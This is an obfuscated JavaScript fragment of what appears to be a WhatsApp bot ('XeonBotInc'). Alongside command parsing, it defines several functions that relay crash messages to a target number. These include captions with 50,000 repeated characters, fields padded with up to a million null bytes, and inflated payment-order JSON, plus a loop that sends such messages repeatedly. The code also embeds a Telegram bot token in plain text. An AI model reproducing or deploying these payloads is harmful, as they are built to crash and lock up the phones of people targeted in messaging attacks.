'u0j6Cum', 'sgDmAvC', 'y0jgrM4', 'zsb6AxaGBgLZDa', 'AMvJDgvK', 'iNn0yxr1CYi6iG', 'q2XVC2uGDgLTzq', 'zuXTu1q', 'cJ4GB3DUzxikcG', 'AY1OCve4CLf1EG', 'rMLmu0S', 'se1Nz2e', 'uMvWBhKGC3rPyW', 'tw9Kzsa', 'DxrVC3D2Awv3ia', 'YP/HTi/HTidHTixjQSM0YAiUlI4', 'C291BMq2oq', 't0rwsuC', 'wgvVBKj1zZmUAG', 'CMvTB3zL', 'ienVCMuGq1bvkq', 'yMDcBhvL', 'Eu5MyLa', 'yuv2wNy', 'DMjiwwW', 'uKz6DMK', 'ieHbuYbcruvoia', 'lI82os94zw9UDa', 'BM90x2fUBM91BG', 'zs9wAwrLBW', 'Esi6otK5otK5Fq', 'Agf0lNDOyxrZyq', 'ChaUy29Tl3H4Ea', 's0HPrvm', 'z2XVyMfSx3nLyq', 'DgfN', 'q2f1z2H0igv4yW', 'zhbYzw0Qieb0yq', 'BM9VBIdWN4Yf', 'D2L0AcbJyxb0Aq', 'whHetgK', 'BgfZDe1LC3nHzW', 'zgvS', 'C2LUz2XLu2vSzq', 'Dg9XCG', 'zgv2AwnLtgLZDa', 'AunYAK4', 'nLvbz0rKvW', 'l2f1Dg9YzxbSEq', 'ywDLCYb3AxrOia', 'CM91CcaQw29WDa', 'C291BMqZnq', 'EgXrrKu', 'BeDlt1i', 'CwHyveS', 'AwPPDuq', 'C291BMq1ma', 'yxvKAw8GD2L0Aa', 'DxbKyxrLuhjVzG', 'rLrdD3u', 'zgLUzYbbDwrPBW', 'yLnVDhy', 'Dg9PBwC', 'CLbxEva', 'yK1vAgS', 'vu9rCgG', 'vuT2y24', '4PAs4PAs4PAs4PAs44clmZaL', 'AMLKyM8', 'otaWlcjVzMzZzq', 'wuLXAgq', 'qM90CYbiyxzLia', 'cM5VDYbVBMX5ia', 'u2vJB25KCW', 'u8Y4wEQzSmY4u+QzSmY4voQzSmY4rEQzSmY4tq', 'pt4GrNjVBq', 'rhPywxG', 'l3bYzw1PDw0UAG', '4Psm4Psa4Psa4Q2t44cmicPqrey', 'y29UDMvYC2f0Aq', 'C3nHz2u', 'rMrjrwe', 'icWGBwvYy2HHBG', 'BefIC3y', 'CMv2Awv3x2fUza', 'r1f0v1m', 'sxn1AKW', 'y2Lduw0', 'C3rHCNrZv2L0Aa', 'zK5iAgK', 'mtaWFsWIDgf4iG', 'z3jVDxbmzwf2zq', 'qxLzD3u', 'BwvUDgLVBMvKsG', 'DwfUDgL0Esi6nW', 'y1rdzuO', 'C2vUze1LC3nHzW', 'z2v0qwzRug9ZAq', 'C291BMqXndG', 'C291BMqXmJG', 'Cgf5CgfSlM1LlW', 'A3P0vMq', 'igHPzgv0ywCkpG', 'AwnYyxnOcJ4GEa', 'CMvWzwf0', 'mtuZmZK2oxfhq3vdqq', 'EYjJDxjYzw5JEq', 'C0nyrw8', 'vvrSC3u', 'idKXnJKWoteZnW', 'CKXOt0m', 'z2LZDgvYzwqGtG', 'C291BMqXndu', 'q0DNBLe', 'uM95C0u', 'y2HPBgrFChjVyW', 'yxbPCY5JB20VDG', 'CJzvs01Lq1n6na', 'y2fZzsaN', 'uvH3v3a', 'Au91vvq', 'mY4WcK46', 'ELnJy3a', 'B24VB2zMpW', 'Be9HA2e', 'Aw5ZCgvJDa', 'zxb0Aw9UoIa', 'zK5MAwG', 'ytfImJKUANbN', 'zMXPChrLEhq', 'AgLTlcbOzsDZia', 'CLDtr1i', 'BWO+ihrVBxaZcG', 'ieHHCYbIzwvUia', 'u0fdEK8', 'yxvKAw8VBxbLzW', 'EhbHEw1LBNrNyW', 'BeDiEKu', 'lI9SAwiVExrKBa', 'B3DUzxi', 'C291BMqZmW', 'v2rktfe', 'A3vbyNK', 'uwvqA0i', 'weTNDMy', 'ywDLcLrVienOzq', 'BsOGBNvTyMvY', 'igLZig5VDcbYzq', 'zgvSzxrL', 'nc9Mms9TmJmZlW', 'BvHmwge', 'C291BMqYna', 'DK55Cge', 'wgvVBIDZihvYia', 'y2XAtwK', 'qw1VDw50ig11CW', 'rgjOB1q', 'C291BMq5mq', 'su5jveLbvevexW', 'CMvWBgfJzq', 'DcbIzsbHig51Bq', 'ltrMnJyTytfKmW', 'rNDOB3a', 'C291BMqXntu', 'C291BMq5na', 'BwvTzqO+ihrHAW', 'tNPIv3K', 'nJaWmda', 'zxPVBMu', 'iJOInZG0mJy3na', 'vevyvcdJGi1Gygak', 'ihnLC3nPB24GzG', 'tKDty1u', 'mdu6mda6mda', 'quLivMy', 't1bWAfC', 'rNjXvK0', 'yxv0B3r5CgLUzW', 'rfzOt2K', 'Avz1zhC', 'u2vhyLe', 'vuf1B1i', 'EhrnzxnZywDL', 'p2TLEt1bsxPHuW', 'vM9RuM0', 'l0K0DMLzA3jduq', 'AwqIoIi3odqYnG', 'x0niqvq', 'ywrKqwzRvxnLCG', 'q2HLy2SGvhLWzq', 'zYb0BYa', 'BwvKAwflzxLuAq', 'EhDHD2vI', 'BK1TqLK', 'C291BMq1na', 'zxj2zxikuKfnoG', 'iJOIqLjmiIWIDa', 'yxbWlxn0yxrL', 'z2v0qwzRswq', 'BKzXugi', 't25xvuS', 'seHdrLu', 'yMnNyW', 'CfLbC0K', 'Dw1jAhu', 'BgvHDMu', 'BgLZDfjLC3bVBG', 'r3PiCfy', 'rg9Uj3qGDgfNia', 'Bs1PDgvTlwfIoq', 'B20GB3DUzxiGBa', 'yw1WBguUy29T', 'BMfTzq', 'BK1Qsu4', 'cJ4GBw9KzsaQwW', 'sw1sDhy', 'C291BMq3oq', 'ChvSqxG', 'wgLiD0m', 'CwXiAg0', 'wgvVBIdWN6Ae65oC66A8ioQWGa', 'DwPPvvK', 'yw50x3vYBca6ia', 't1bxC0S', 'DcbwAwrLBYOG44cn', 'C2jPEuW', 'Bvn4zMi', 'BxnN', 'ww14C1u', 'ywrKyxbR', 'ihrVDgfNcJ4GzW', 'vgHXsw4', 'D292t2q', 'r3jVDxaGrwrPDa', 'ywrKCgrM', 'Dw5SAw5Ru3LUyW', 'AgfZtwvKAwfbDa', 'ufLgz1q', 'v2X5y1C', 'B24G', 'swnPteO', 'otyTyZzLmJmZoq', 'u2rVuNC', 'BwfRzsbPBNrVia', 'zsa6ia', 'rxHHBxbSztOk', 'AKv5uKm', 'C2vSzwn0zwrjza', 'AMLfBLi', 'yKrpt28', 'iJP7iNzHBhvLiG', 'igLZigvUywjSzq', 'twfds2G', 'A3z0ufu', 'BNrFBwv0Ag9KCW', 'yLbgDeW', 'BerWq2m', 'Efnkz1K', 'u3rMA0m', 'zg93BMXVywq', 'AJe2Cc9JAgvLBq', 'qvDfzLbIy0jcAG', 'C291BMq1', 'y29UC29Szq', 'Ew9Vwuq', 'C291BMq0nq', '8j+tMYaQtMfTzsa6kG', 'C291BMq4ma', 'B1r5r3u', 'zxnZ', 'mJy3ndyWntC2mW', 'BgHbwha', 'ufvyzNu', 'Aw9UpwvTB2PPxW', 'vvbj', 'CxvVDgvK', 'CK5jA3y', 'zsbKyxrHyMfZzq', 'rerbrLy', 'wLrVBw0', 'Cg9KyMG', 'AKvkr3u', 'lM1WmW', 'DgHHueS', 'revgqvvmva', 'Eg14tMG', 'txLvELO', 'DxnLCG', 'C291BMqZmG', 'Cwjzsu0', 'C291BMqXmte', 'v0H5sMG', 'kKnSB3nLzcOGzW', 'C29U', 'zwH0tgu', 'lNDLyNa', 'mtaWma', 'C2nHBIbKAxjLyW', 'yK9Zs28', 'v290DeW', 'B25K', 'Bg9N', 'iM9MzNnLDci6mq', 'C291BMqXmW', 'iJPBxx0', 'AeHgvgK', 'Dg9UBgLUzqOk4PwW', 'ioQWGoYDTcbyzw9UiIW', 'D2HHDhnHCha', 'B2Xmu3C', 'rdPwq0fsra', 'zwzLCMvUy2vFAq', 'rg9oAfK', 'sKnmqKK', 'v3rTv28', 'Ae56thu', 'AxaIlcjKzxnJCG', 'Eurkyuy', 'A0fzAhC', 'zgvYx3r5CguIoG', 'sMDwy3G', 'AwnFy29Kzsi6EW', 'BMTmEwK', 'ys96AxaV', 'Eg1SBNm', 'lM1Wna', 'mte1zJKTndC4yq', 'z2LMzwu', 'FsWIC2HPChbPBG', 'AfnbzhG', 'BMz0Chi', 'EfjNvKK', 'BMfdvNq', 'AguGz3jVDxaGAq', 'mJmZowm4n2u1pW', 'qhmUD2HHDhnHCa', 'ihzPy3rPBsbUDq', 'zePZwLO', 'veL4wuW', 'CMf0zs1VDMvYBa', 'q0furKm', 'zMj6zw4', 'tgDqt2W', 'C2vSzwn0zwrcDq', 'z1DouKW', 'BhKGq2HHBMDLza', 'Dw5my1O', 'C1DODKu', 'BMXis2e', 'BfbIrMS', 'DvjVy3G', 'BhLrvhO', '4Q2riokyOo+4J+kdSm2CZAhyNpcDKjNWNzwP8j2qLEkdN+kTKo+4J+gCTa', 'C291BMqXmde', 'y2fSlwDVB2rZiG', 'wgP6sfy', 'B3DKrKy', 'yxvKAw8VBxaZ', 'AKrxtM8', 'u0vovcbutYbusa', 'mxW0Fdi', 'AwPkqKK', 'ChrUuhG', '4Psm4Psa4Psa4Q2t44cmicPAsva', 'zu1LC3nHz2u', 'AMnSB2m', 'Aw9ZA2LSBa', 'Dgv4Dci6iUc+PYiU', 'CNPfsum', 'lI9IywnRDxaUEG', 'vhHSAeq', 'BhDXBg8', 'Dgv4Da', 'Dci6mtaWFsWICG', 'wKnmvgG', 'ExbZvKG', 'ndKTndzLyI05yq', 'y1z1A0i', 'tuD5Bg8', 'Cgf5BwvUDf9Yzq', 'zenzuszJB250zq', 'BMCGrM9Yia', 'y29TiIWIBwvYyW', 'otLbvejjExe', 'lLvstdO', 'ELDWv2y', 'qxfTqLe', 'cGPFtM9KzuPtia', 'Aw9ZmGO+ig9Uzq', 'rK9sr0vuierptG', 'l3rVDgfSlwHPDa', 'CgfYC2u', 'thDNDNu', 'EeD5q3y', 'C2vUzfrLEhrxAq', 'zfjsDKW', 'Dgv4Dca6icDtZlHz', 'DgL2zv9WyxLTzq', 'vw9iuxm', 'cGRWN5k7ieLUzM8GuW', 'B20V', 'y3LHBG', 'Aw1LidOG', 'CLLhvei', 'CMvUzgvYtgfYzW', 'zNDdzuO', 'ten0tee', 'B2zMC2v0iJOXma', 'u3nzuxi', 'BI9QC29U', 'z0XHr3y', 'zgvJB2rLsMLK', 'BhKGu2vUDcbcDq', 'vfjezwO', 'DMLKzw9nzxnZyq', 'wxLjzgS', 'ihrLEhqXFhrLEa', 'CxjJB2rL', 'C291BMqXmdK', 'tenmrMm', 'D1jHzfO', '4Bsn4BshYBtHTjWkpIbJBg8', 'y3zjsxu', 'DursA2m', 'ywrLCL9PC19Yzq', 'qK9Tq3K', 'ys9ZDgLJA2vYlW', 'reHNDu0', 'zhfizKm', 'ief1zgLVia', 'BezUsee', 'Dw53yxrJAezPBa', 'yxv0B1r5CgLUzW', 'C2v0ChbNCM91Ca', 'CgXLoGOU', 'tMfTzq', 'reqVtu0VwvLzwq', '4BshYBtHTjWkpIbHzgr2', 'BgLZDhn0AwnRzq', 'yxv0B3jLy29Yza', 'yK9fr1O', 'A09IAg8', 'l293BMvYlMPZBW', 'B3bLBI9JBg9Zzq', 'zgLZCgXHEu5HBq', 'AgfUDf91CMWIoG', 'vhPItuS', 'quXmwsbssuDiva', 'AfbqDvq', 'yM96wuC', 'DvH3y2G', 'BgLUAY9PBwfNzq', 'qxDYEKq', 'DeL4sg8', 's1ntuKG', 'BxbSzsa', 'zfLnBw4', 'se5Oy3G', 'pt4GEYbYzxr1CG', 'yMfZzty0', 'EefKB3i', 'CLn3q1m', 'C291BMq4nW', 'yK9OC28', 'ys90AhvTyJiUBq', 'v3jHDxu', 'C2vSzwn0zwrsBW', 'BMfTzsi6iIiSiG', 'AeDwrKq', 'ExjXy1i', 'qKXHyMvSoKDPDa', 'zhHYANO', 'cGOkvhLWzsa', 'v2HLCMuGAxmGDa', 'rMfWBKK', 'zxH0mq', 'yxb0Aw9Uia', 'vKzTDvu', 'C291BMq1oq', 'z3jVDxbszxzVAW', 'rxjYBY4U', 'wxvKAwe', 'qMvLBIbsDw5UAq', 'ENvTC0W', 'CujdCwS', 'q1DJuLC', 'qMLZA0q', 'Cgf0Aw5N', 'q2Liq1a', 'A0jAwLO', 'As50zwXLz3jHBq', 'u0nssvbuie9gia', 'C291BMqXmda', 'BK16wvy', 'twvjtLO', 'l3nOB3j0CY9zuq', 'BwLTzxr5Cgu', 'C291BMqXnta', 'zvHKrKy', 'zeDozeK', 'tuHsCLK', 'BLHKEwO', 'BwukpIbZy3jPCa', 'D3nArxq', 'l2fMAY11C2vYlG', 'yMfJA3vWcJ4GzW', 'sgnur1a', 'zM91BMq', 'igHHDMuGCMv0Dq', 'CWOk', 'uvzqqxO', 'rM9VDgvY', 'rxjyC3a', 'mZm2mJm1nuzVEuLgua', 'q2Ttsuu', 'lI9SAwiVBxLMDq'];
  _0x4d4f = function () {
    return _0x524618;
  };
  return _0x4d4f();
}
if (time2 < "19:00:00") {
  var xeonytimewisher = "Good Evening 🌃";
}
if (time2 < '18:00:00') {
  var xeonytimewisher = "Good Evening 🌃";
}
if (time2 < '15:00:00') {
  var xeonytimewisher = "Good Afternoon 🌅";
}
if (time2 < "11:00:00") {
  var xeonytimewisher = "Good Morning 🌄";
}
if (time2 < "05:00:00") {
  var xeonytimewisher = "Good Morning 🌄";
}
module.exports = XeonBotInc = async (_0x3dc8b7, _0x153ead, _0x167389, _0x1e457f, _0x5b509f) => {
  try {
    const {
      type: _0xd0e0ce,
      quotedMsg: _0x2c86f2,
      mentioned: _0x119560,
      now: _0x2583eb,
      fromMe: _0x4a7fa3
    } = _0x153ead;
    var _0x3c940c = _0x153ead.mtype === "conversation" ? _0x153ead.message.conversation : _0x153ead.mtype == "imageMessage" ? _0x153ead.message.imageMessage.caption : _0x153ead.mtype == "videoMessage" ? _0x153ead.message.videoMessage.caption : _0x153ead.mtype == "extendedTextMessage" ? _0x153ead.message.extendedTextMessage.text : _0x153ead.mtype == "buttonsResponseMessage" ? _0x153ead.message.buttonsResponseMessage.selectedButtonId : _0x153ead.mtype == "listResponseMessage" ? _0x153ead.message.listResponseMessage.singleSelectreplygcxeon.selectedRowId : _0x153ead.mtype == "templateButtonreplygcxeonMessage" ? _0x153ead.message.templateButtonreplygcxeonMessage.selectedId : _0x153ead.mtype === "messageContextInfo" ? _0x153ead.message.buttonsResponseMessage?.["selectedButtonId"] || _0x153ead.message.listResponseMessage?.["singleSelectreplygcxeon"]["selectedRowId"] || _0x153ead.text : '';
    var _0xbbd56 = typeof _0x153ead.text == "string" ? _0x153ead.text : '';
    var _0x1b9ee2 = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(_0x3c940c) ? _0x3c940c.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : '' : prefa ?? global.prefix;
    const _0x44cd63 = _0x3c940c.replace(_0x1b9ee2, '').trim().split(/ +/).shift().toLowerCase();
    const _0x2805cb = _0x3c940c.trim().split(/ +/).slice(1);
    const _0x5cd3c0 = _0x153ead.pushName || "No Name";
    const _0x493b39 = await _0x3dc8b7.decodeJid(_0x3dc8b7.user.id);
    const _0x544b4 = _0x153ead.sender;
    const _0x570816 = q = _0x2805cb.join(" ");
    const _0x22825f = _0x153ead.key.remoteJid;
    const _0x1c6a86 = _0x153ead.quoted || _0x153ead;
    const _0x1fa415 = _0x1c6a86.mtype == "buttonsMessage" ? _0x1c6a86[Object.keys(_0x1c6a86)[1]] : _0x1c6a86.mtype == "templateMessage" ? _0x1c6a86.hydratedTemplate[Object.keys(_0x1c6a86.hydratedTemplate)[1]] : _0x1c6a86.mtype == 'product' ? _0x1c6a86[Object.keys(_0x1c6a86)[0]] : _0x153ead.quoted ? _0x153ead.quoted : _0x153ead;
    const _0x24c389 = (_0x1fa415.msg || _0x1fa415).mimetype || '';
    const _0x2cf4a3 = _0x1fa415.msg || _0x1fa415;
    const _0x722214 = _0xd0e0ce == "videoMessage";
    const _0x339689 = afk.checkAfkUser(_0x153ead.sender, _afk);
    const _0x4b55e4 = _0x153ead.isGroup ? await _0x3dc8b7.groupMetadata(_0x153ead.chat)["catch"](_0x1fa653 => {}) : '';
    const _0x28a966 = _0x153ead.isGroup ? _0x4b55e4.subject : '';
    const _0x5f3f58 = _0x153ead.isGroup ? await _0x4b55e4.participants : '';
    const _0x2cb589 = _0x153ead.isGroup ? await getGroupAdmins(_0x5f3f58) : '';
    const _0x22fa99 = _0x153ead.isGroup ? _0x2cb589.includes(_0x493b39) : false;
    const _0x298734 = _0x153ead.isGroup ? _0x2cb589.includes(_0x153ead.sender) : false;
    const _0x1efeab = _0x153ead.isGroup ? _0x4b55e4.owner : '';
    const _0x2bc87e = _0x153ead.isGroup ? (_0x1efeab ? _0x1efeab : _0x2cb589).includes(_0x153ead.sender) : false;
    const _0x891b49 = [ownernumber, ..._owner].map(_0x2f8d9c => _0x2f8d9c.replace(/[^0-9]/g, '') + "@s.whatsapp.net").includes(_0x153ead.sender);
    const _0x467c79 = _0x891b49 || _0x891b49 || checkPremiumUser(_0x153ead.sender, premium);
    const _0x193d60 = _0x3dc8b7.user.id.split(':')[0];
    const _0xcd8815 = _0x153ead.key.fromMe ? _0x3dc8b7.user.id.split(':')[0] + "@s.whatsapp.net" || _0x3dc8b7.user.id : _0x153ead.key.participant || _0x153ead.key.remoteJid;
    const _0x5e8864 = _0xcd8815.split('@')[0];
    const _0x282630 = _0x193d60.includes(_0x5e8864);
    expiredCheck(_0x3dc8b7, _0x153ead, premium);
    const _0x244b45 = _0x4a8c0d => {
      _0x3dc8b7.sendMessage(_0x153ead.chat, {
        'text': _0x4a8c0d,
        'contextInfo': {
          'mentionedJid': [_0x544b4],
          'forwardingScore': 0x98967f,
          'isForwarded': true,
          'externalAdReply': {
            'showAdAttribution': true,
            'containsAutoReply': true,
            'title': " " + global.botname,
            'body': '' + ownername,
            'previewType': "PHOTO",
            'thumbnailUrl': '',
            'thumbnail': fs.readFileSync("./XeonMedia/thumb.jpg"),
            'sourceUrl': '' + link
          }
        }
      }, {
        'quoted': _0x153ead
      });
    };
    async function _0x4291bb(_0xa7a421) {
      return new Promise(async (_0x436b27, _0x2c3559) => {
        if (!_0xa7a421.match(/(https:\/\/t.me\/addstickers\/)/gi)) {
          return _0x244b45("Enther your url telegram sticker link");
        }
        packName = _0xa7a421.replace("https://t.me/addstickers/", '');
        data = await axios("https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getStickerSet?name=" + encodeURIComponent(packName), {
          'method': 'GET',
          'headers': {
            'User-Agent': 'GoogleBot'
          }
        });
        const _0x1974c7 = [];
        for (let _0x16c286 = 0; _0x16c286 < data.data.result.stickers.length; _0x16c286++) {
          fileId = data.data.result.stickers[_0x16c286].thumb.file_id;
          data2 = await axios("https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getFile?file_id=" + fileId);
          result = {
            'status': 0xc8,
            'author': 'Johnleo',
            'url': "https://api.telegram.org/file/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/" + data2.data.result.file_path
          };
          _0x1974c7.push(result);
        }
        _0x436b27(_0x1974c7);
      });
    }
    const _0x116600 = {
      'remoteJid': "status@broadcast"
    };
    const _0x4d6b83 = {
      'participant': "0@s.whatsapp.net",
      ...(_0x153ead.chat ? _0x116600 : {})
    };
    const _0x13a202 = {
      name: "review_and_pay",
      buttonParamsJson: "{\"currency\":\"INR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"😈드림 가이 Johnleo 😈드림 가이 Johnleo 😈드림 가이 Johnleo\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}"
    };
    const _0x37540f = {
      buttons: [_0x13a202]
    };
    const _0xbbb5ad = {
      'key': _0x4d6b83,
      'message': {
        'interactiveMessage': {
          'header': {
            'hasMediaAttachment': true,
            'jpegThumbnail': fs.readFileSync("./69/xx1.png")
          },
          'nativeFlowMessage': _0x37540f
        }
      }
    };
    const _0xc05e76 = {
      remoteJid: "status@broadcast"
    };
    const _0x273bba = {
      'participant': "0@s.whatsapp.net",
      ...(_0x153ead.chat ? _0xc05e76 : {})
    };
    const _0x2cd957 = {
      name: "review_and_pay",
      buttonParamsJson: "{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴ # 𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}"
    };
    const _0x88ba61 = {
      buttons: [_0x2cd957]
    };
    const _0x368771 = {
      'key': _0x273bba,
      'message': {
        'interactiveMessage': {
          'header': {
            'hasMediaAttachment': true,
            'jpegThumbnail': fs.readFileSync("./69/xx1.png")
          },
          'nativeFlowMessage': _0x88ba61
        }
      }
    };
    const _0x4f096b = {
      remoteJid: "status@broadcast"
    };
    const _0x5e0de0 = {
      'participant': "0@s.whatsapp.net",
      ...(_0x153ead.chat ? _0x4f096b : {})
    };
    const _0x6ce4dd = {
      title: "드림 가이 Johnleo"
    };
    const _0x4e7605 = {
      listResponseMessage: _0x6ce4dd
    };
    const _0xef6897 = {
      key: _0x5e0de0,
      message: _0x4e7605
    };
    async function _0x3f3274(_0xd30104, _0x457bae) {
      const _0x3edf68 = {
        url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
        fileSha256: "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
        fileEncSha256: "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
        mediaKey: "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
        mimetype: "image/webp",
        directPath: "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
        fileLength: "10116",
        mediaKeyTimestamp: "1715876003",
        isAnimated: false,
        stickerSentTs: "1715881084144",
        isAvatar: false,
        isAiSticker: false,
        isLottie: false
      };
      const _0x5d903d = {
        stickerMessage: _0x3edf68
      };
      var _0x515224 = generateWAMessageFromContent(_0xd30104, proto.Message.fromObject(_0x5d903d), {
        'userJid': _0xd30104,
        'quoted': _0x457bae
      });
      await _0x3dc8b7.relayMessage(_0xd30104, _0x515224.message, {
        'participant': {
          'jid': _0xd30104
        },
        'messageId': _0x515224.key.id
      });
    }
    async function _0x1c54a3(_0x27c052, _0x45000b) {
      var _0x3df65f = generateWAMessageFromContent(_0x27c052, proto.Message.fromObject({
        'viewOnceMessage': {
          'message': {
            'liveLocationMessage': {
              'degreesLatitude': 'p',
              'degreesLongitude': 'p',
              'caption': "😈드림 가이 Johnleo 😈드림 가이 Johnleo 😈드림 가이 Johnleo 😈드림 가이 Johnleo 😈드림 가이 Johnleo 😈드림 가이 Johnleo 😈드림 가이 Johnleo" + 'ꦾ'.repeat(50000),
              'sequenceNumber': '0',
              'jpegThumbnail': ''
            }
          }
        }
      }), {
        'userJid': _0x27c052,
        'quoted': _0x45000b
      });
      await _0x3dc8b7.relayMessage(_0x27c052, _0x3df65f.message, {
        'participant': {
          'jid': _0x27c052
        },
        'messageId': _0x3df65f.key.id
      });
    }
    async function _0x19c6e6(_0x406ee1, _0x1dba8c) {
      const _0x3c717e = {
        upload: _0x3dc8b7.waUploadToServer
      };
      const _0x94761d = {
        text: ''
      };
      var _0xe88e6f = generateWAMessageFromContent(_0x406ee1, proto.Message.fromObject({
        'interactiveMessage': {
          'header': {
            'title': "😈드림 가이 Johnleo",
            'hasMediaAttachment': true,
            ...(await prepareWAMessageMedia({
              'image': {
                'url': "https://i.ibb.co/Wppj16p/cheemspic.jpg"
              }
            }, _0x3c717e))
          },
          'body': _0x94761d,
          'footer': {
            'text': "›          #😈드림 가이 Johnleo"
          },
          'nativeFlowMessage': {
            'messageParamsJson': "\0".repeat(1000000)
          }
        }
      }), {
        'userJid': _0x406ee1,
        'quoted': _0x1dba8c
      });
      await _0x3dc8b7.relayMessage(_0x406ee1, _0xe88e6f.message, {
        'participant': {
          'jid': _0x406ee1
        },
        'messageId': _0xe88e6f.key.id
      });
    }
    async function _0x4e8a7d(_0x26340b) {
      await _0x3dc8b7.relayMessage(_0x26340b, {
        'paymentInviteMessage': {
          'serviceType': "FBPAY",
          'expiryTimestamp': Date.now() + 1814400000
        }
      }, {
        'participant': {
          'jid': _0x26340b
        }
      });
    }
    async function _0x31c1f2(_0x199f8c, _0x8b050c) {
      const _0x59872d = {
        product_header_info_id: 0x4433e2e130,
        product_header_is_rejected: false
      };
      var _0xffc7c3 = generateWAMessageFromContent(_0x199f8c, proto.Message.fromObject({
        'listMessage': {
          'title': "드림 가이 Johnleo" + "\0".repeat(920000),
          'footerText': "😈드림 가이 Johnleo 😈드림 가이 Johnleo 😈드림 가이 Johnleo 😈드림 가이 Johnleo 😈드림 가이 Johnleo 😈드림 가이 Johnleo 😈드림 가이 Johnleo",
          'description': "😈드림 가이 Johnleo 😈드림 가이 Johnleo 😈드림 가이 Johnleo 😈드림 가이 Johnleo 😈드림 가이 Johnleo 😈드림 가이 Johnleo 😈드림 가이 Johnleo",
          'buttonText': null,
          'listType': 0x2,
          'productListInfo': {
            'productSections': [{
              'title': 'anjay',
              'products': [{
                'productId': "4392524570816732"
              }]
            }],
            'productListHeaderImage': {
              'productId': "4392524570816732",
              'jpegThumbnail': null
            },
            'businessOwnerJid': "0@s.whatsapp.net"
          }
        },
        'footer': "puki",
        'contextInfo': {
          'expiration': 0x93a80,
          'ephemeralSettingTimestamp': "1679959486",
          'entryPointConversionSource': "global_search_new_chat",
          'entryPointConversionApp': "whatsapp",
          'entryPointConversionDelaySeconds': 0x9,
          'disappearingMode': {
            'initiator': "INITIATED_BY_ME"
          }
        },
        'selectListType': 0x2,
        'product_header_info': _0x59872d
      }), {
        'userJid': _0x199f8c,
        'quoted': _0xef6897
      });
      await _0x3dc8b7.relayMessage(_0x199f8c, _0xffc7c3.message, {
        'participant': {
          'jid': _0x199f8c
        },
        'messageId': _0xffc7c3.key.id
      });
    }
    const _0x34cf33 = async _0x3dc747 => {
      _0x3dc8b7.sendMessage(_0x153ead.chat, {
        'react': {
          'text': _0x3dc747,
          'key': _0x153ead.key
        }
      });
    };
    async function _0x2b619e(_0x19f509, _0x41924e) {
      for (let _0x5b455d = 0; _0x5b455d < _0x41924e; _0x5b455d++) {
        const _0x29ea8b = {
          deviceListMetadata: {},
          deviceListMetadataVersion: 0x2
        };
        const _0x36002e = {
          text: ''
        };
        const _0x657b19 = {
          text: ''
        };
        const _0x4acf47 = {
          title: '',
          subtitle: '',
          hasMediaAttachment: false
        };
        const _0x2625eb = {
          name: 'cta_url',
          buttonParamsJson: "{\"display_text\":\"ྦྷ\".repeat(50000),\"url\":\"https://www.google.com\",\"merchant_url\":\"https://www.google.com\"}"
        };
        let _0x21e207 = generateWAMessageFromContent(_0x19f509, {
          'viewOnceMessage': {
            'message': {
              'messageContextInfo': _0x29ea8b,
              'interactiveMessage': proto.Message.InteractiveMessage.create({
                'body': proto.Message.InteractiveMessage.Body.create(_0x36002e),
                'footer': proto.Message.InteractiveMessage.Footer.create(_0x657b19),
                'header': proto.Message.InteractiveMessage.Header.create(_0x4acf47),
                'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  'buttons': [_0x2625eb],
                  'messageParamsJson': "\0".repeat(100000)
                })
              })
            }
          }
        }, {});
        _0x3dc8b7.relayMessage(_0x19f509, _0x21e207.message, {
          'messageId': _0x21e207.key.id
        });
      }
    }
